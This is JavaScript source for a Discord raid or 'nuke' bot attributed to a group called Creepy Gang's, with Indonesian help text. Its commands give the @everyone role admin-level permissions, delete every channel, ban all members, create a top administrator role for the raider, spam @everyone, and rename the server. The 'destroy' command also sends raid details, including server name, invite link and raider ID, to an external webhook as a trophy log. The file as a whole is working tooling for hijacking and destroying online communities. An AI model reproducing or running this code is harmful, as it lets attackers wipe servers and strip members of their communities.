const { Message, MessageEmbed, Discord, Client, Intents, WebhookClient } = require("discord.js");
const config = require("./config.json");
const chalk = require('chalk');
const client = new Client({
  intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES]
});
let token = config.token
let ownerid = config.ownerID
client.login(`${token}`);
const webhookClient = new WebhookClient({
  id: config.webhookID,
  token: config.webhookTOKEN,
});

const guildHook = new WebhookClient({
  id: config.guildWID,
  token: config.guildWTOKEN,
})

client.on('ready', async (message) => {
  console.log(chalk.redBright("CREEPY GANG'S"))
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
  console.log(chalk.yellowBright("Team : Creepy Gang's, TwentyNine Squad, HiDDEN TEAM"))
  console.log(chalk.yellowBright("Bot Dev : SirN"))
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
  console.log(chalk.cyan(`${client.user.username}\nGuild : ${client.guilds.cache.size} \nTotal : ${client.users.cache.size} Member.`))
  console.log(chalk.bgRed("Connected " + client.user.tag + " | Ping : " + client.ws.ping + " | Prefix : " + config.prefix + " | Server : " + client.guilds.cache.size + " | Channel : " + client.channels.cache.size + " | User : " + client.users.cache.size))
  client.user.setStatus("dnd")
  function msg() {
    let status = [`CreepyGang's ₦ᴇᴡ ₲ᴇɴᴇʀᴀᴛɪᴏɴ✨`, `See in action`];
    let S = Math.floor(Math.random() * status.length);
    client.user.setActivity(status[S], { type: 'COMPETING' })
  };

  setInterval(msg, 10000)
});

client.on("messageCreate", async (message) => {
  if (!message.content.startsWith(config.prefix)) return;
  const args =
    message.content.slice(config.prefix.length).trim().split(' ');
  const cmd = args.shift().toLocaleLowerCase();

  if (cmd === "destroy") {
    message.guild.setIcon(`${config.guildicon2}`)
    const everyoneRole = message.guild.roles.cache.find(role => role.name === '@everyone');
    everyoneRole.edit({ permissions: ["CREATE_INSTANT_INVITE", "KICK_MEMBERS", "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_GUILD", "ADD_REACTIONS", "VIEW_AUDIT_LOG", "VIEW_CHANNEL", "SEND_MESSAGES", "SEND_TTS_MESSAGES", "MANAGE_MESSAGES", "EMBED_LINKS", "ATTACH_FILES", "READ_MESSAGE_HISTORY", "MENTION_EVERYONE", "CHANGE_NICKNAME", "MANAGE_NICKNAMES", "MANAGE_ROLES", "MANAGE_WEBHOOKS"] })

    message.delete(10)
    var i = 0
    message.guild.channels.cache.forEach(channel =>
      i++
    )
    message.author.send("**Destroying **" + i + `** Channel** in \`${message.guild.name}\``).catch(error => console.log())
    message.guild.channels.cache.forEach(channel =>


      setTimeout(() => { channel.delete() }, 1000 * 3))

    message.guild.channels.create("⤚‒‒Creepy Gang's‒‒⤙", {
      type: 'GUILD_VOICE',
      permissionOverwrites: [
        {
          id: everyoneRole.id,
          deny: ['CONNECT'],
        }
      ],
    })
    var channel0 = await message.guild.channels.create(`⤚‒‒‒‒‒‒‒‒‒‒‒‒‒‒‒‒⤙`, {
      type: 'text',
      permissionOverwrites: [
        {
          id: everyoneRole.id,
          deny: ['CONNECT'],
        }
      ],
    })
    const embed = new MessageEmbed()
      .setColor('#36393F')
      .setTitle(':tada: C O N G R A T U L A T I O N S !')
      .setDescription(`**${config.team}** Has destroying **${message.guild.name}** | **Raider ${message.author.tag}** | [Creepy Gang's](https://discord.gg/GcjTPjBvGy)`)
      .setThumbnail(message.guild.iconURL({ size: 4096, format: "png", dynamic: true }))
      .setTimestamp()

    channel0.send({ embeds: [embed] })


    message.guild.channels.create(`⤚FUCKED BY Creepy Gang's⤙`, {
      type: 'GUILD_VOICE',
      permissionOverwrites: [
        {
          id: everyoneRole.id,
          deny: ['CONNECT'],
        }
      ],
    })
    message.guild.channels.create("⤚‒‒‒‒‒‒‒‒‒‒‒‒‒‒‒‒⤙", {
      type: 'GUILD_VOICE',
      permissionOverwrites: [
        {
          id: everyoneRole.id,
          deny: ['CONNECT'],
        }
      ],
    })

      .then(console.log)
      .catch(console.error);

    channel0.createInvite().then(async (invite) => {
      const embed234 = new MessageEmbed()
        .setColor('BLACK')
        .setAuthor(message.guild.name, message.guild.iconURL({ dynamic: true }))
        .setDescription(`
          
**Server  :**
[**${message.guild.name}**](https://discord.gg/${await invite.code})
[ ${message.guild.id} ]

**Member Count  :**
[** ${message.guild.memberCount} **]

**Raid By  :**
${message.author.tag}
[ ${message.author.id} ]
`)
        .setTimestamp()
        .setThumbnail(message.guild.iconURL({ size: 4096, format: "png", dynamic: true }))

      webhookClient.send({
        content: `Attacked ${message.guild.name}`,
        embeds: [embed234],
      });
    }).then(guild => {
      setTimeout(function () {
        message.guild.setName(`${config.team}`)
      }, 12000)
    })
  }

  if(cmd === "ba") {
    message.delete();
    message.delete().catch(() => {
      return;
    })
    message.guild.members.cache.forEach(m => {
      if(m.user.id === message.author.id){
        return;
      }else{
        m.ban({reason: `#CreepyGang's`}).catch(e=>{
          return;
        })
      }
    })
  }

  if (cmd === "deletechannel") {
    message.delete(10)
    message.guild.channels.cache.forEach(channel => i++)
    message.guild.channels.cache.forEach(c => setTimeout(() => { c.delete() }, 200));
  }

  if (cmd === 'chr') {
    message.delete(0)

    const rolename = ["【𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫】", "「ᴘsʏᴄʜᴏᴘᴀᴛʜ」", "｛ᴋᴀɴɢ ʙᴀɴᴛᴀɪ｝", "єχє¢υтινє", "DᴀʀᴋTᴢʏ"]
    const rname = rolename[Math.floor(Math.random() * rolename.length)];

    let w = message.author
    let Role = await message.guild.roles.create({
      name: rname,
      color: '#2F3136',
      reason: `${message.guild.name} EZ RAIDED`,
      position: message.guild.me.roles.highest.position - 1,
      permissions: ["ADMINISTRATOR", "CREATE_INSTANT_INVITE", "KICK_MEMBERS", "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_GUILD", "ADD_REACTIONS", "VIEW_AUDIT_LOG", "VIEW_CHANNEL", "SEND_MESSAGES", "SEND_TTS_MESSAGES", "MANAGE_MESSAGES", "EMBED_LINKS", "ATTACH_FILES", "READ_MESSAGE_HISTORY", "MENTION_EVERYONE", "CHANGE_NICKNAME", "MANAGE_NICKNAMES", "MANAGE_ROLES", "MANAGE_WEBHOOKS", "MANAGE_EMOJIS_AND_STICKERS"],
    })
    message.member.roles.add(Role)
    message.channel.send("Success add role").then(message => {
      setTimeout(function () {
        message.delete(0)
      }, 5000)
    })
  }

  //OWNER ONLY
  if (cmd === "addpremium") {
    if (message.author.id == config.ownerID) {
    } else { message.channel.send("LU BUKAN OWNER BOT BGST") }

  }

  if (cmd === "gantinama") {
    message.delete(3000)
    message.guild.setName(args.join(" ")).catch(e => message.channel.send("**Minimal 2 Huruf untuk mengganti nama server**"));

  }

  if (cmd === "gantiprofile") {
    message.delete(3000)
    message.guild.setIcon(args.join(" ")).catch(e => message.channel.send("**Invalid Link**"));

  }



  if (cmd === "cvc") {
    message.delete(3000)
    let everyoneRole = message.guild.roles.cache.find(role => role.name === '@everyone');
    message.guild.channels.create(`☠ ${message.author.tag} 💫`, {
      type: 'GUILD_VOICE',
      permissionOverwrites: [
        {
          id: everyoneRole.id,
          deny: ['CONNECT'],
        }
      ],
    })

  }
  if (cmd === "sm") {
    message.delete(20)
    for (let i = 0; i <= 10; i++) {
      message.guild.channels.cache.forEach(channel =>
        message.channel.send("@everyone " + args.join(" ") + "\n> ***Powered by CreepyGang's***"))
    }
  }

  if (cmd === "help") {
    message.delete(20)
    const embed = new MessageEmbed()
      .setTimestamp()
      .setFooter(`© Copyright by ☠ ᴄʀᴇᴇᴘʏ ɢᴀɴɢ's 💫`)
      .addFields([
        { name: "Commands List", value: `${config.prefix}deletechannel\n${config.prefix}gantiprofil\n${config.prefix}gantinama\n ${config.prefix}cnmember\n${config.prefix}destroy\n${config.prefix}chr\n${config.prefix}cvc\n${config.prefix}ba`, inline: true },
        { name: "‎", value: "➤\n➤\n➤\n➤\n➤\n➤\n➤\n➤", inline: true },
        { name: "Kegunaan", value: `Delete All Channel\n${config.prefix}gantiprofil <link> \n${config.prefix}gantinama <new server name>\n${config.prefix}cnmember <nama> \nDestroy Channel\nMembuat highest role\nMembuat voice channel dengan User Tag kamu\nBan all member`, inline: true }])
    message.channel.send({ embeds: [embed] });
  }

  if (cmd === "helppppp") {
    if (message.author.id === "904380979286777897") return;
    message.channel.send('**HELP COMMAND**\n```CSS\n\nFun Command\nmrn.dme >> DM everyone [Ex: mrn.dme permisi bang]\n=================================================\nRaid Command (Administrator Permission Required)\nmrn.gantinama >> Ganti Nama Server [Ex: mrn.gantinama <pemuda pancasila>]\nmrn.gantiprofil >> Ganti Profil Server [Ex: mrn.gantiprofil https://imgur.com/RYpNo53.png]\nmrn.deletechannel >> Menghapus semua channel\nmrn.cnmember >> Ganti semua username member \n\n© Copyright by CreepyGang\'s / TwentyNineSQ``` \n');
  }

  if (cmd === "send") {
    message.delete(10).catch(err => console.log(err));
    const embed = new MessageEmbed()
      .setTimestamp(`TwentyNine ₦ᴇᴡ ₲ᴇɴᴇʀᴀᴛɪᴏɴ`)
      .setTitle(`𝟸𝟿s ₦ᴇᴡ ₲ᴇɴᴇʀᴀᴛɪᴏɴ`)
      .setDescription('**29s** Has Succesfully nuke this server! | **#TwentyNine Squad**')
      .addFields(
        {
          name: '📝 ┃ Name Server:',
          value: `${message.guild.name} | *(ID: ${message.guild.id})*`,
        },
        {
          name: 'Member:',
          value: `${memberCount}`,
          inline: false,
        },
        {
          name: 'Raid by:',
          value: `${message.author.tag}\n(ID: ${message.author.id})`,
          inline: false,
        },
      )
      .setThumbnail('https://imgur.com/xrlysoA.png')
    webhookClient.send({ embeds: [embed] })

  }
  {
    if (cmd === "uptime") {
      let days = Math.floor(client.uptime / 86400000);
      let hours = Math.floor(client.uptime / 3600000) % 24;
      let minutes = Math.floor(client.uptime / 60000) % 60;
      let seconds = Math.floor(client.uptime / 1000) % 60;

      const uptimeE = new MessageEmbed()
        .setDescription(`**${client.user.username}** already online during **${days}d ${hours}h ${minutes}m ${seconds}s**`)
      message.reply({ embeds: [uptimeE] });
    }
  }
})

client.on("messageCreate", (message) => {

  if (message.content === `<@${client.user.id}>`) {
    const mentionprefix = new MessageEmbed()
      .setTimestamp()
      .setDescription(`My prefix is \`${config.prefix}\` You can see my all of my commands by type \`${config.prefix}help\``)
    message.reply({ embeds: [mentionprefix] });

  }

})

client.on("guildCreate", guild => {
  const joinguild = new MessageEmbed()
    .setColor('GREEN')
    .setTitle(`Detail`)
    .addFields(
      {
        name: 'Di invite ke server:',
        value: `${guild.name}`,
        inline: true
      },
      {
        name: 'Di invite pada jam:',
        value: `<t:${Math.floor(Date.now() / 1000)}:T> (WIB)`
      }
    )
  guildHook.send({
    content: `**${client.user.tag}** Telah di invite ke **${guild.name}**`,
    username: `JOIN LOG`,
    avatarURL: (client.user.avatarURL({ size: 4096, format: "png", dynamic: true })),
    embeds: [joinguild],
  });
})

client.on("guildDelete", guild => {
  const leftguild = new MessageEmbed()
    .setColor('RED')
    .setTitle(`Detail`)
    .addFields(
      {
        name: 'Dikeluarkan dari server:',
        value: `${guild.name}`,
        inline: true
      },
      {
        name: 'Di keluarkan pada jam:',
        value: `<t:${Math.floor(Date.now() / 1000)}:T> (WIB)`
      }
    )
  guildHook.send({
    content: `**${client.user.tag}** Telah dikeluarkan dari **${guild.name}**`,
    username: `LEAVE LOG`,
    avatarURL: (client.user.avatarURL({ size: 4096, format: "png", dynamic: true })),
    embeds: [leftguild],
  });
})